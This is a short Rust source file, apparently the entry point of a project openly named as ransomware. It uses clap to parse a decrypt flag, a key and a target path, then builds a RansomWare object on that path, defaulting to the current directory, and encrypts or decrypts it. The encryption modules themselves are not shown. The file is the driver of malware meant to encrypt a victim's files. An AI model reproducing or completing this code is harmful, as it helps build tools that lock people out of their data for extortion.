mod crypt;
mod ransomware;

use clap::Parser;
use ransomware::RansomWare;

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    ///specify if you wanna decrypt
    #[clap(short, long)]
    decrypt: bool,
    ///key to use as decryption/encryption key!
    #[clap(short, long)]
    key: Option<String>,
    ///the path to encrypt/decrypt
    #[clap(short, long)]
    path: Option<String>
}



fn main() {
    let args = Args::parse();
    let mut ransomware = RansomWare::new(args.path.unwrap_or(String::from(".")), args.key.unwrap_or(String::new()));
    if args.decrypt {
        ransomware.decrypt();
    }else {
        ransomware.encrypt();
    }
}
